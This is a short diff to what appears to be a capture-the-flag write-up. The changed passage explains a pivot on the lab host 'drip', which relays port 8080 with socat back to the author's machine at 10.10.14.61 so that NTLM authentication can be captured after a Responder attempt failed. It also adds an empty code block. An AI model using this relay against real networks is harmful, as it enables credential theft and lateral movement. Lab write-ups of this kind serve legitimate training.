@@ -802,7 +802,11 @@ So i cannot capture the NTLM hash of the user using responder
 ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.61:80
 ```
 
-Ill get a statically compiled socat binary on the SSH target,
+Ill get a statically compiled socat binary on the SSH target, then set it to listen on port 8080 and forward traffic back to me on `10.10.14.61:80`, im doing this becuase i cannot get it to connect back to me directly, so ill get it to connect to the drip server then forward the auth to me using socat
+
+```python
+
+```
 
 
 
